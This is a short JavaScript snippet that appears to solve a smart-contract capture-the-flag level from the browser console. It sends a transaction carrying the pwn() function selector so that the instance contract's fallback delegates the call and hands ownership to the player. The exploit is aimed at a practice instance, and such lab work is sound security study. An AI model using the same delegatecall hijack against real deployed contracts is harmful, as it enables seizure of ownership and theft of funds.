/** solved on browser's console */

/** 
 * SEND bytes(abi.encodeWithSignature("pwn()")) to call Fallback in instance's contract
*/
await contract.sendTransaction({from: player, to: instance, data: "0xdd365b8b" })